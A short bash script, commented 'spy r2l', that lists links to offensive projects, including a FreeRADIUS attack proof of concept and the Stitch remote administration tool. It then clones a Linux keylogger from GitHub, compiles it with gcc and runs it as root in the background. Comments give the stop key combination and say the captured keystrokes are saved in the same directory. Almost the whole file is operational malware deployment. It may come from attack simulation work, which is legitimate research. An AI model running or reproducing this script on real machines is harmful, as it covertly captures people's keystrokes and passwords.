#!/bin/bash

#spy r2l

#https://gitlab.inria.fr/msabt/attack-poc-freeradius

#https://github.com/nathanlopez/Stitch

#https://github.com/y0g3sh-99/linux-keylogger (used)



# Clone the repository
git clone https://github.com/y0g3sh-99/linux-keylogger
cd linux-keylogger || exit

# Install gcc if not installed
if ! command -v gcc &> /dev/null; then
    sudo apt update
    sudo apt install -y gcc
fi

# Compile the keylogger
gcc keylogger.c -o keylogger

# Run the keylogger in the background
sudo ./keylogger &

#stop the program with ALT + CTRL + SHIFT + ESC
#Find the keylogs file in the same directory